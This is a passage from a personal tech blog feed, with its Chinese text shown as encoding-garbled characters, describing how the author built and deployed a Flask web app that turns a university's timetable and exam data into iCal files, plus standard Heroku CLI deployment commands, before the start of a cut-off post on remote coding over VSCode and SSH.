å°±éº»çƒ¦äº†â€¦â€¦ä¹‹å‰åšçš„ç™»å½•æ˜¾ç„¶å°±ä¸æˆåŠŸäº†ã€‚</p><p>è§£å†³æ–¹æ¡ˆçš„è¯ï¼Œåœ¨æœ¬åœ°ï¼Œæ˜¯é€šè¿‡æŠŠéªŒè¯ç ä¸‹è½½ä¸‹æ¥ï¼ŒPILè°ƒç”¨æœ¬åœ°å›¾ç‰‡æŸ¥çœ‹å™¨æ¥æ˜¾ç¤ºï¼Œè¿›è€Œåœ¨å‘½ä»¤è¡Œé‡Œè¾“å…¥ã€‚</p><p>ä¸è¿‡webç«¯å°±æœ‰ç‚¹éº»çƒ¦äº†ã€‚</p><p>ä½†æ€ä¹ˆè¯´å¥½å‘¢ï¼Œä¸å¦¨ç¢ç”¨åŒæ ·çš„æ€è·¯è§£å†³è¿™ä¸€é—®é¢˜å‘¢å˜»å˜»å˜»ã€‚åé¢å†è¯´ã€‚</p><blockquote><p>å…¶å®åˆ°å†™è¿™ç¯‡blogä¸ºæ­¢è¿˜æ²¡å¼„æ¸…æ¥šä»–éªŒè¯ç çš„å…·ä½“æœºç†ã€‚ï¼ˆç­‰æˆ‘è€ƒå®Œè¯•æœ‰ç©ºå†æŠ˜è…¾å¥½äº†å–µ</p></blockquote><p><strong>ä¸æƒ³å¾€ä¸‹çœ‹åˆæƒ³ä½“éªŒ<code>NUAA_iCal_Web</code>åœ¨çº¿ç‰ˆæœ¬çš„ï¼Œ<a href="https://nuaaical.herokuapp.com/">ç‚¹è¿™é‡Œ</a>è®¿é—®å§ã€‚</strong>   </p><p><br><br></p><hr><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><h3 id="Herokuç®€ä»‹"><a href="#Herokuç®€ä»‹" class="headerlink" title="Herokuç®€ä»‹"></a><em>Heroku</em>ç®€ä»‹</h3><p>å¶å°”æœ‰ä¸€å¤©åœ¨è½¬GitHubçš„æ—¶å€™ï¼Œçœ‹åˆ°æŸä¸ªé¡¹ç›®ä¸‹æœ‰ä¸ªç½‘é¡µç«¯çš„ç•Œé¢ï¼ŒREADMEé‡Œé¢ä¹Ÿæœ‰ä¸ª<code>deploy with heroku</code>ä¹‹ç±»çš„å›¾æ ‡æŒ‰é’®ã€‚ç‚¹è¿›å»çœ‹äº†çœ‹ï¼Œç„¶åå†æŸ¥äº†æŸ¥èµ„æ–™ã€‚</p><blockquote><p><em>Heroku</em> is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.  </p></blockquote><blockquote><p>Herokuæ˜¯ä¸€ä¸ªæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€çš„äº‘å¹³å°å³æœåŠ¡ã€‚åœ¨2010å¹´è¢«Salesforce.comæ”¶è´­ã€‚Herokuä½œä¸ºæœ€å¼€å§‹çš„äº‘å¹³å°ä¹‹ä¸€ï¼Œä»2007å¹´6æœˆèµ·å¼€å‘ï¼Œå½“æ—¶å®ƒä»…æ”¯æŒRubyï¼Œä½†åæ¥å¢åŠ äº†å¯¹Javaã€Node.jsã€Scalaã€Clojureã€Pythonä»¥åŠï¼ˆæœªè®°å½•åœ¨æ­£å¼æ–‡ä»¶ä¸Šï¼‰PHPå’ŒPerlçš„æ”¯æŒã€‚åŸºç¡€æ“ä½œç³»ç»Ÿæ˜¯Debianï¼Œåœ¨æœ€æ–°çš„å †æ ˆåˆ™æ˜¯åŸºäºDebiançš„Ubuntuã€‚</p></blockquote><p>å¥½ä¸œè¥¿å‘€ï¼</p><p>å‘ç°herokuå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šå…è´¹æ­å»ºç½‘ç«™ï¼Œå½“ç„¶å‰ææ˜¯è¦æœ‰ä¸€ä¸ªwsgiæ¥å£ä¹‹ç±»çš„ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯è¯´éœ€è¦è®©ä½ çš„ä¸œè¥¿èƒ½é€šè¿‡ç½‘ç»œè®¿é—®å¾—åˆ°ã€‚  </p><blockquote><p>å…¶å®é‚£æ—¶å€™æˆ‘è¿wsgiæ˜¯å•¥éƒ½ä¸çŸ¥é“â€¦â€¦  </p></blockquote><p>å®˜ç½‘é“¾æ¥ï¼š<a href="https://links.jianshu.com/go?to=https://www.heroku.com/">https://www.heroku.com/</a></p><p>å…·ä½“çš„å®šä»·ç­–ç•¥å‚è§<a href="https://www.heroku.com/pricing">è¿™é‡Œ</a>ã€‚  </p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/price.png" alt="price">  </p><p>Freeç‰ˆæœ¬çš„è¯ï¼Œæœªè®¤è¯ç”¨æˆ·æ¯ä¸ªæœˆ550å°æ—¶å…è´¹åŠ¨æ€æ—¶é•¿ï¼Œè®¤è¯ç”¨æˆ·ï¼ˆå¥½åƒæ˜¯ç»‘å®šé“¶è¡Œå¡ï¼‰1000å°æ—¶ï¼›30åˆ†é’Ÿæ— è®¿é—®æ— æ´»åŠ¨çš„è¯ä¼šè‡ªå·±ç¡å¤§è§‰ï¼Œä¸ä¼šå ç”¨ä½ çš„å®è´µæ—¶é•¿ï¼›æä¾›äºŒçº§åŸŸåï¼Œè¿˜å¯ä»¥è‡ªå·±ç»‘ç±³ã€‚  </p><p><strong>å¯¹äºnuaaicalæ¥è¯´ï¼Œè¿™ä¸ªå®Œå…¨å¤Ÿç”¨äº†å‘¢ï¼</strong>  </p><p>é‚£å°±å¹²è„†æŠ˜è…¾ä¸€ä¸‹å¥½äº†ã€‚  </p><p><br><br></p><h3 id="NUAA-iCal-Webç«¯æ­å»º"><a href="#NUAA-iCal-Webç«¯æ­å»º" class="headerlink" title="NUAA iCal Webç«¯æ­å»º"></a>NUAA iCal Webç«¯æ­å»º</h3><p>éœ€è¦ä¸€ä¸ªwsgiæ¥å£ä¹‹ç±»çš„å˜›ï¼Œflaskã€djangoè¿™äº›ç°æˆçš„å°±è¡Œã€‚</p><p>æœ¬æ¥å°±å•¥ä¹Ÿä¸çŸ¥é“ä¹Ÿæ²¡ç©è¿‡ï¼Œçœ‹æ¥ä¸€ä¸‹flaskæŒºç®€å•çš„ï¼Œäºæ˜¯å°±ç®€å•å­¦äº†ä¸€ä¸‹<strong>flaskæ¡†æ¶</strong>ã€‚</p><p>ç„¶è€ŒçœŸæ­£æ­å»ºçš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€å †å¥‡å¦™çš„bugï¼Œæœ¬åœ°è·‘ç€å¥½å¥½çš„ï¼Œä¸Šäº†herokuå°±ç‚¸äº†ã€‚ï¼ˆè¿™ä¸ªä¸ç»†è¯´äº†  </p><p>å®é™…ä¸Šä»£ç å°±æ˜¯ä»æœ¬åœ°ç‰ˆæœ¬æ”¹çš„ï¼Œæ¯•ç«Ÿåœ¨å¼€å‘çš„æ—¶å€™ç•™äº†å¾ˆå¤šç°æˆçš„æ¥å£äº†ï¼Œæ”¹ä¸€æ”¹è°ƒç”¨ä¸€ä¸‹å‡½æ•°ä¹‹ç±»çš„å°±å®Œäº‹äº†ã€‚</p><p>ä¸è¿‡è¿™ä¸ª<strong>éªŒè¯ç </strong>æŠ˜è…¾äº†è€åŠå¤©ã€‚</p><p>è¿™é‡Œçš„ç­–ç•¥æ˜¯ï¼Œå½“ä½ è®¿é—®é¡µé¢çš„åŒæ—¶ï¼Œåç«¯å»è®¿é—®æ•™åŠ¡ç³»ç»Ÿï¼ŒæŠŠéªŒè¯ç å›¾ç‰‡çˆ¬ä¸‹æ¥é€ç»™å‰ç«¯ï¼ŒåŒæ—¶å»ºç«‹äº†ä¸€ä¸ªä¸ä½ æœ‰å…³çš„sessionã€‚</p><p>å½“ä½ postç”¨æˆ·åå¯†ç åŠéªŒè¯ç åï¼Œåç«¯åˆ©ç”¨åŒä¸€ä¸ªsessionå»è®¿é—®æ•™åŠ¡ç³»ç»Ÿï¼Œ<br>è¿›è€Œçˆ¬å–è¯¾è¡¨åŠè€ƒè¯•ä¿¡æ¯ï¼Œ<br>ç”Ÿæˆicalendaræ—¥å†æ–‡ä»¶ï¼Œ<br>è€Œåä»¥é™„ä»¶ä¸‹è½½çš„å½¢å¼æ„é€ responseï¼Œä»è€Œå¾—åˆ°å±äºä½ çš„icalè¯¾è¡¨ã€‚  </p><br><p>å½“ç„¶ï¼Œä¸€å®šç¨‹åº¦ä¸Šå®‰å…¨ä¸€ç‚¹ï¼Œè¿™ä¸ªsessionåœ¨æ„é€ å®Œresponseä¹‹åå°±é”€æ¯äº†ï¼Œä¸ä¿ç•™åœ¨äº‘å¹³å°ä¸Šã€‚</p><p>ï¼ˆè¿™æ ·å…¶å®è¿˜æ˜¯æ²¡ææ¸…æ¥šéªŒè¯ç çš„æœºç†ï¼Œä¸€å®šç¨‹åº¦ä¸Šç›¸å½“äºç»•è¿‡äº†è€Œå·²ã€‚</p><p>å…¶å®åˆ°è¿™çš„è¯ï¼Œæœ¬åœ°æ­å»ºå°±ç»“æŸäº†ã€‚</p><hr><p>ä¸è¿‡è¿˜è€ƒè™‘äº†ä¸€ä¸‹<strong>å¤æ‚çš„ç”Ÿäº§ç¯å¢ƒ</strong>â€¦â€¦  </p><ul><li><p>æ¯”å¦‚è¯´<strong>ç™»å½•ä¿¡æ¯é‡å¤post</strong>ï¼Œè€ŒåŸæ¥çš„éªŒè¯ç å°±ä¸å†æœ‰æ•ˆäº†ã€‚</p><p>è¿™é‡Œå…¶å®æƒ³äº†å‡ ç§æ–¹æ¡ˆï¼Œä½†æ˜¯è¡Œä¸é€šã€‚æœ€åå¹²è„†æŠ˜è…¾äº†ä¸€æ³¢HTMLï¼ŒåŠ äº†ä¸ªå‰ç«¯ç•Œé¢ï¼Œå¦‚æœæ²¡ç™»é™†æˆåŠŸå°±æç¤ºä¸€ä¸‹ï¼Œç„¶åè¿‡ä¸€ä¼šå„¿è¿”å›ä¸»é¡µå¥½äº†ã€‚233</p><p><strong>ï¼ˆæœ‰æ›´å¥½çš„æ–¹æ¡ˆæ¬¢è¿æå‡ºå–µï¼</strong></p></li><li><p>æ¯”å¦‚<strong>æœªç™»å½•æƒ…å†µä¸‹ç›´æ¥è®¿é—®å¯¼å‡ºicalçš„é¡µé¢</strong>  </p><p>è¿™ä¸ªä¹Ÿæ˜¯ç›´æ¥è¿”å›ä¸»é¡µäº†ã€‚ä¸è¿‡è¿™é‡Œè¿™ä¸ªåˆ¤æ–­æŠ˜è…¾äº†è€åŠå¤©ã€‚</p><p>æœ€åçš„æ–¹æ¡ˆæ˜¯åœ¨flaskçš„sessioné‡Œå»ºç«‹äº†ä¸€ä¸ªå±äºå½“å‰sessionçš„boolå˜é‡ï¼Œé»˜è®¤ä¸ºFalseï¼Œç™»å½•ä»¥åè®¾ç½®ä¸ºTrueã€‚</p><blockquote><p>ä¹‹å‰ç›´æ¥å†™åœ¨ç¨‹åºçš„å…¨å±€å˜é‡é‡Œï¼Œæœ¬åœ°è·‘ç€å¥½å¥½çš„ï¼Œä¸Šäº‘å¹³å°å°±ç‚¸äº†â€¦â€¦å†è§ã€‚   </p><p>è¿˜å†™è¿‡åœ¨flaskçš„gå˜é‡é‡Œï¼Œåæ¥ä»”ç»†æŸ¥äº†èµ„æ–™ï¼Œgå˜é‡å¥½åƒæ˜¯åªåœ¨å½“å‰é¡µé¢è¯·æ±‚ä¸­æœ‰æ•ˆï¼Œæ„æ€å°±æ˜¯ä½œç”¨èŒƒå›´ä¸ä¸€æ ·ï¼Œäºæ˜¯å¦å†³äº†ã€‚</p></blockquote></li><li><p>æ•™åŠ¡ç³»ç»Ÿ<strong>è¿æ¥å·²é‡ç½®</strong></p><p>è¿™ä¸ªæ˜¯ä»–æ•™åŠ¡ç³»ç»Ÿçš„é—®é¢˜å•Šï¼Œéš¾é¡¶äº†ã€‚è¿˜æ˜¯æŠ˜è…¾äº†è€åŠå¤©æ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ã€‚  </p><p>åˆæ”¹äº†æ”¹ç™»å½•çš„å»¶æ—¶ï¼Œè¿™å›å˜æˆéšæœºå»¶æ—¶äº†ï¼Œè€Œä¸”æ—¶é—´ä¹ŸåŠ é•¿äº†ã€‚  </p><p>è€Œä¸”è¿˜æŠŠçˆ¬è™«çš„UAæ”¹æˆäº†å½“å‰æµè§ˆå™¨çš„UAã€‚IPçš„è¯å¥½åƒæ²¡åŠæ³•äº†ã€‚   </p><p>é—®é¢˜æœ‰æ‰€æ”¹å–„â€¦ç„¶è€Œå¶å°”è¿˜å­˜åœ¨ã€‚</p><p><strong>å¤§ä¸äº†å¤šè¯•å‡ æ¬¡å°±å¥½äº†ã€‚</strong></p></li><li><p>etc.</p></li></ul><blockquote><p>å…¶å®è¿˜æœ‰ä¸ªæ‰“ç®—æ˜¯åšä¸ªå‰ç«¯iframæ¡†æ¶ä¹‹ç±»çš„ç›´æ¥åµŒå¥—å®˜æ–¹çš„ç™»å½•ç•Œé¢ï¼Œç„¶åç™»å½•æˆåŠŸåå†åˆ©ç”¨ç™»å½•ä¿¡æ¯æ¥çˆ¬å–è¯¾è¡¨ï¼Œè¿™æ ·ä¸€å®šç¨‹åº¦ä¸Šå¯èƒ½è¿˜æ›´å®‰å…¨ä¸€ç‚¹ã€‚<br>å†è¯´å§â€¦â€¦</p></blockquote><br><hr><br><h3 id="Herokuæ­å»º"><a href="#Herokuæ­å»º" class="headerlink" title="Herokuæ­å»º"></a>Herokuæ­å»º</h3><p>ä¸‹é¢æ¥ç®€å•è®°å½•ä¸€ä¸‹Herokuçš„éƒ¨ç½²ã€‚</p><ol><li><p><strong>æ³¨å†Œä¸€ä¸ªè´¦å·</strong></p><p>ç½‘å€<a href="https://links.jianshu.com/go?to=https://www.heroku.com/">https://www.heroku.com/</a></p><p>ç•¥ã€‚å»ºè®®ç”¨gmailï¼Œä¸è¿‡ä¹Ÿçœ‹åˆ°ç”¨å›½å†…é‚®ç®±ä¹ŸæˆåŠŸçš„ã€‚  </p></li><li><p><strong>å®‰è£…Heroku CLI å‘½ä»¤è¡Œæ¥å£</strong></p><p>Win-x64ï¼š<a href="https://cli-assets.heroku.com/heroku-x64.exe">ä¸‹è½½åœ°å€</a></p><p>å…¶ä»–ç¯å¢ƒçš„è§å®˜ç½‘å¥½äº†ã€‚<a href="https://devcenter.heroku.com/articles/heroku-cli">https://devcenter.heroku.com/articles/heroku-cli</a></p><p>å®‰è£…å®Œä¹‹åå°±å¯ä»¥åœ¨å‘½ä»¤è¡Œç”¨<code>heroku</code>å‘½ä»¤äº†ã€‚</p></li><li><p><strong>ç™»å½•</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku login</code></pre><p>ä¼šå¼¹å‡ºç½‘é¡µç™»å½•éªŒè¯ï¼Œæˆ–è€…åœ¨å‘½ä»¤è¡Œç™»å½•ã€‚</p></li><li><p><strong>å‡†å¤‡å¥½app</strong></p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229023615517.png" alt="æ”¯æŒçš„app"></p><p>ä½ çœ‹ä»–æ”¯æŒçš„è¯­è¨€æŒºå¤šçš„å‘¢ã€‚</p><p>æˆ‘è¿™é‡Œç”¨åˆ°çš„å°±æ˜¯pythonå•¦ã€‚</p><p>è¿™ä¸ªåœ¨ä¸Šä¸€èŠ‚å·²ç»æ­å»ºå¥½äº†å–µã€‚</p></li><li><p><strong>åˆ›å»ºapp</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku create</code></pre><p>è¿™æ—¶å€™åŒæ—¶å»ºç«‹äº†ä¸€ä¸ªåä¸º<code>heroku</code>çš„git remoteä»“åº“ï¼Œè¿æ¥åˆ°äº†ä½ æœ¬åœ°çš„gitä»“åº“ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç°åœ¨ç½‘ç«™ä¸Šåˆ›å»ºä¸€ä¸ªåº”ç”¨ï¼Œå†clone</p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku git:clone -a nuaaical<span class="token builtin class-name">cd</span> nuaaical</code></pre><p>è¿™é‡Œå‰ææ˜¯å»ºç«‹å¥½äº†åä¸º<code>nuaaical</code>çš„åº”ç”¨äº†ã€‚</p></li><li><p><strong>å»ºç«‹ä¾èµ–ç›¸å…³çš„<code>requirements.txt</code></strong></p><p>ç•¥ã€‚</p></li><li><p><strong>æŒ‡å®šæ‰§è¡Œçš„å…¥å£</strong></p><p><strong>è¿™é‡Œç®—æ˜¯ä¸€ä¸ªå‘å§ï¼ŒæŠ˜è…¾äº†å¥½ä¹…æ‰å‘ç°ã€‚</strong></p><p>ä½ å¿…é¡»å…ˆåœ¨ä»£ç ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªåä¸º<code>Procfile</code>çš„æ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™ä¸Šä½ è¦ä»–æ‰§è¡Œçš„å‘½ä»¤ã€‚æ¯”å¦‚æ‰§è¡Œä¸€ä¸ªpythonæ–‡ä»¶ä¹‹ç±»çš„ã€‚</p><p>åœ¨è¿™é‡Œç”¨çš„æ˜¯<code>gunicorn</code>æ¥å»ºç«‹ä¸€ä¸ªwebåº”ç”¨ã€‚ï¼ˆflaskåªç”¨äºæœ¬åœ°æµ‹è¯•ä½¿ç”¨</p><pre class="language-none"><code class="language-none">web: gunicorn web:app</code></pre><p>ç¬¬äºŒä¸ª<code>web</code>æ˜¯æ–‡ä»¶åï¼ˆ<code>web.py</code>ï¼‰ï¼Œ<code>app</code>æ˜¯flaskå®ä¾‹åŒ–çš„å¯¹è±¡å•¦ã€‚<br>ï¼ˆä»£ç é‡Œå†™çš„<code>app = Flask(__name__)</code>  </p></li><li><p><strong>æŒ‡å®šç”¨æ„å»ºè¯­è¨€ï¼ˆå¯ç•¥ï¼Ÿï¼‰</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku buildpacks:set heroku/python</code></pre><p>æ˜¾ç¤ºæŒ‡å®šç”¨pythonæ¥æ„å»ºæ‰“åŒ…ï¼ˆç½‘ä¸Šæœ‰çš„è¯´ä¸æŒ‡å®šä¼šæŠ¥é”™ï¼Ÿ</p></li><li><p><strong>éƒ¨ç½²ä»£ç </strong></p><p>ç»ˆäºå¯ä»¥éƒ¨ç½²äº†å‘€ï¼ç›´æ¥pushå¥½äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push heroku master</code></pre><p>å¦‚æœä¸è¡Œçš„è¯åŠ ä¸Š<code>-f</code>å¼ºåˆ¶push<strong>ï¼ˆå°å¿ƒä¸€ç‚¹ï¼‰</strong>ã€‚</p><p>ç„¶åå¯ä»¥çœ‹åˆ°éƒ¨ç½²çš„æ—¥å¿—ï¼Œå¦‚æœæœ‰é—®é¢˜å°±å†çœ‹çœ‹ã€‚</p><p>æ²¡é—®é¢˜çš„è¯ï¼Œæ•ˆæœç±»ä¼¼ä¸‹é¢çš„ã€‚</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/push.png" alt="push"></p></li><li><p><strong>çœ‹çœ‹ä½ çš„ç½‘ç«™å§</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku <span class="token function">open</span></code></pre><p>ç„¶åä¼šè°ƒç”¨ä½ çš„æµè§ˆå™¨æ‰“å¼€ã€‚</p><p>æˆ–è€…è‡ªå·±åœ¨æµè§ˆå™¨è®¿é—®å°±å¥½äº†ã€‚</p></li></ol><p><strong>å˜»å˜»å˜»ï¼Œåˆ°è¿™å°±ç»“æŸå•¦~</strong></p><p><br><br></p><h3 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h3><p>å½“ç„¶è¿˜æœ‰ä¸€äº›<strong>å¸¸ç”¨å‘½ä»¤</strong>ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>æŸ¥çœ‹æ—¥å¿—**(debugå¿…å¤‡äº†)**</p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku logs --tail</code></pre></li><li><p>çœ‹ä¸€ä¸‹è¿˜æœ‰å¤šå°‘å‰©ä½™æ—¶é•¿</p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku <span class="token function">ps</span></code></pre></li><li><p>æ‰“å¼€appæœåŠ¡</p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku ps:scale <span class="token assign-left variable">web</span><span class="token operator">=</span><span class="token number">1</span></code></pre></li><li><p>å…³é—­appæœåŠ¡</p><pre class="language-bash" data-language="bash"><code class="language-bash">heroku ps:scale <span class="token assign-left variable">web</span><span class="token operator">=</span><span class="token number">0</span></code></pre></li><li><p>etc.</p></li></ul><blockquote><p>å®˜æ–¹æ–‡æ¡£<code>Getting Started on Heroku</code>çœ‹è¿™é‡Œ <a href="https://devcenter.heroku.com/start">https://devcenter.heroku.com/start</a></p></blockquote><p><br><br></p><p>é™¤æ­¤ä»¥å¤–ï¼ŒHerokuè¿˜æ”¯æŒ<code>pipeline</code>ï¼Œè¿˜å¯ä»¥æˆæƒä»GitHubä¸ŠåŒæ­¥éƒ¨ç½²ï¼Œè¿˜æœ‰å®¹å™¨å•¥çš„â€¦â€¦</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229033131933.png"></p><p>æ„Ÿè§‰è¿˜æ˜¯æŒºä¸é”™çš„å‘¢ï¼  </p><p><br><br></p><hr><h2 id="Achievements"><a href="#Achievements" class="headerlink" title="Achievements"></a>Achievements</h2><p>éƒ¨ç½²å¥½çš„webç«¯ç½‘å€ï¼š</p><p><a href="https://nuaaical.herokuapp.com/">https://nuaaical.herokuapp.com/</a></p><p><strong>æ¬¢è¿æ¥è¯•è¯•å‘€ï¼</strong></p><p>ç¬¬ä¸€æ¬¡è®¿é—®å¯èƒ½ä¼šèŠ±ä¸€äº›æ—¶é—´ï¼Œç­‰ä¸€ç­‰å§ã€‚</p><p>å¦‚æœä¸æˆåŠŸçš„è¯åˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼ˆä½†ä¸è¦é‡å¤æäº¤ç™»å½•ä¿¡æ¯ï¼‰ï¼Œæˆ–é‡æ–°å¼€ä¸€ä¸ªé¡µé¢è®¿é—®ã€‚</p><p>åŒæ—¶å¤šäººè®¿é—®çš„è¯ä¹Ÿå¯èƒ½ä¼šæœ‰é—®é¢˜ï¼ˆæ²¡è¯•è¿‡ï¼‰ï¼Œé‚£å°±å†è¯•è¯•å§ã€‚ï¼ˆæ‘Šæ‰‹</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend.png" alt="å‰ç«¯"></p><blockquote><p>å¥½äº†æˆ‘çŸ¥é“è¿™ä¸ªé¡µé¢ä¸‘äº†ã€‚ç°å­¦çš„HTMLï¼Œåˆ«è¯´äº†ã€‚</p><p>å…¶å®ä¹‹å‰å¥¶å†°å¥¶å†°å¥¶å†°å†°åšäº†ä¸€ä¸ªå‰ç«¯çš„â†“ </p><p>åé¢å†æŠ˜è…¾å§å’•å’•å’•</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend_vue.png" alt="vue.jså‰ç«¯"></p><p><strong>æ¬¢è¿æ¥è´¡çŒ®ä»£ç å‘€ï¼</strong></p></blockquote><blockquote><p>å…¶å®ä¹‹å‰è¿˜æŠ˜è…¾äº†è€åŠå¤©ï¼Œå°è¯•äº†<strong>åœ¨Azureä¸Šéƒ¨ç½²</strong>ï¼Œä¹ŸæˆåŠŸäº†ã€‚</p><p>éœ€è¦åœ¨VSCodeä¸­è¿›è¡Œéƒ¨ç½²ï¼Œç„¶ååœ¨é…ç½®é‡Œè®¾å¥½å¯åŠ¨å‘½ä»¤ï¼ˆä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼‰ã€‚</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_deploy.png" alt="Azure_deploy"></p><p>ä¸è¿‡ç°åœ¨AzureæœåŠ¡åˆ°æœŸäº†ã€‚éƒ¨ç½²çš„ç½‘ç«™ä¹Ÿåœæ­¢äº†å‘¢ã€‚</p><p>æˆªä¸ªå›¾çºªå¿µä¸€ä¸‹å§ã€‚</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_website.png" alt="Azure_website"></p><p>ï¼ˆhackathonçš„æ—¶å€™ç™½å«–çš„Azureè¿˜æ˜¯æŒºçˆ½çš„233  </p></blockquote><p>åŒæ—¶ï¼Œ<strong>ä»£ç å¼€æºåœ¨GitHubä¸Šäº†ã€‚æ¬¢è¿æ¥ç‚¹ä¸ªstarï¼Œæä¸ªPRå–µï¼</strong>   </p><p><a href="https://github.com/miaotony/NUAA_iCal_Web">https://github.com/miaotony/NUAA_iCal_Web</a></p><p><br><br></p><p><strong><em>ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œæœªç»å…è®¸ç¦æ­¢å•†ç”¨ï¼Œè°¢è°¢ã€‚</em></strong></p><p>æ–‡ç« ä¸­ä¸å…å­˜åœ¨é—®é¢˜ï¼Œæ¬¢è¿æå‡ºã€‚  </p><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://devcenter.heroku.com/">https://devcenter.heroku.com/</a></li><li><a href="https://www.jianshu.com/p/191248ad2639">https://www.jianshu.com/p/191248ad2639</a></li></ol><p><br><br></p><blockquote><p>æµªå¤Ÿäº†ï¼Œç»§ç»­å‡†å¤‡è€ƒè¯•ã€‚ï¼ˆçœŸéš¾é¡¶â€¦â€¦</p><p>æœŸæœ«å†²å†²å†²ï¼</p><p>è¯´ä¸å®šè¿™æ˜¯ä»Šå¹´æœ€åä¸€ç¯‡blogäº†å–µã€‚</p><p>æºœäº†æºœäº†ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Web </tag>
            
            <tag> iCal </tag>
            
            <tag> Heroku </tag>
            
            <tag> Deployment </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | åŸºäºVSCodeå’Œsshå®ç°è¿œç¨‹ç¼–ç¨‹/ç‚¼ä¸¹</title>
      <link href="2019/12/21/Idea_RemoteProgramming/"/>
      <url>2019/12/21/Idea_RemoteProgramming/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>åœ¨å†…ç½‘æœ‰ä¸€å°æœåŠ¡å™¨ï¼Œèƒ½è¿æ¥å¤–ç½‘ä½†ç”±äºæ²¡æœ‰å…¬ç½‘ IP è€Œæ— æ³•åœ¨å¤–ç½‘ç›´æ¥è®¿é—®ï¼Œä¹‹å‰æƒ³è¦åœ¨ä¸Šé¢è·‘ç¨‹åºçš„æ—¶å€™ï¼Œå°±å¾—é€šè¿‡è¿œç¨‹æ¡Œé¢è¿›è¡Œæ“ä½œã€‚è™½ç„¶ <code>Teamviewer</code> é€Ÿåº¦è¿˜å¯ä»¥ï¼Œä½†æ€»æ„Ÿè§‰æœ‰ç‚¹ä¸å¤ªçˆ½â€¦â€¦  </p><p>å¾ˆä¹…ä»¥å‰ï¼ˆå¤§æ¦‚ä¸€ä¸¤ä¸ªæœˆå‰ï¼‰å°±åœ¨é€¼ä¹ä¸Šçœ‹åˆ°è¿‡ä¸€ç¯‡æ–‡ç« è¯´å¯ä»¥</p><blockquote><p><strong>ä½¿ç”¨vscodeè¿›è¡Œè¿œç¨‹ç‚¼ä¸¹</strong>  <em>ï¼ˆåŸæ–‡è§ Reference #1</em></p></blockquote><p>å™«ï¼æˆ‘æ¥å…´è¶£äº†ï¼Œè€Œä¸”å…¶å®æ—©å°±æƒ³è¯•è¯•äº†ï¼Œç„¶è€Œä¹‹å‰åœ¨å¿™åˆ«çš„æ²¡ç©ºæŠ˜è…¾<del>ï¼ˆå…¶å®ç°åœ¨ä¹Ÿæ²¡ç©ºï¼‰</del>ï¼Œå°±æ˜¯å‰å‡ å¤©åœ¨é…æœåŠ¡å™¨ç¯å¢ƒçš„æ—¶å€™<del>ï¼ˆéº»çƒ¦åˆ°çˆ†ç‚¸ï¼Œæœ€è®¨åŒé…ç¯å¢ƒäº†ï¼‰</del>ï¼Œä¸€æƒ³å¹²è„†å°±å†æŠ˜è…¾ä¸€ä¸‹ï¼Œå¼„å¥½è¿œç¨‹ç‚¼ä¸¹ï¼ˆç¼–ç¨‹ï¼‰å§ã€‚  </p><p>äºæ˜¯ä¹å°±è¿™æ ·è¿Linuxå‘½ä»¤éƒ½ä¸çŸ¥é“å‡ ä¸ªçš„æ†¨æ†¨çæŠ˜è…¾äº†ä¸€ä¸¤å¤©çš„sshï¼Œç»ˆäºå®ç°äº†è¿œç¨‹ç‚¼ä¸¹ï¼Œ<strong>è´¼æœ‰æˆå°±æ„Ÿå˜»å˜»å˜»</strong>ã€‚</p><p>å…¶ä¸­é‡åˆ°äº†ä¸€äº›å¥‡æ€ªçš„é—®é¢˜ï¼Œç®€å•è®°å½•ä¸€ä¸‹ï¼Œä¹Ÿæ–¹ä¾¿æˆ‘å¿˜äº†å†å›æ¥çœ‹çœ‹å§ã€‚</p><p>æ—¶é—´æœ‰é™ï¼ŒVSCodeçš„éƒ¨åˆ†å°±å¤§æ¦‚æä¸€ä¸‹æ€è·¯ï¼Œ<strong>é‡ç‚¹æ˜¯<code>ssh</code>çš„éƒ¨åˆ†</strong>å§â€¦â€¦   </p><h2 id="Guidance-for-ssh"><a href="#Guidance-for-ssh" class="headerlink" title="Guidance for ssh"></a>Guidance for 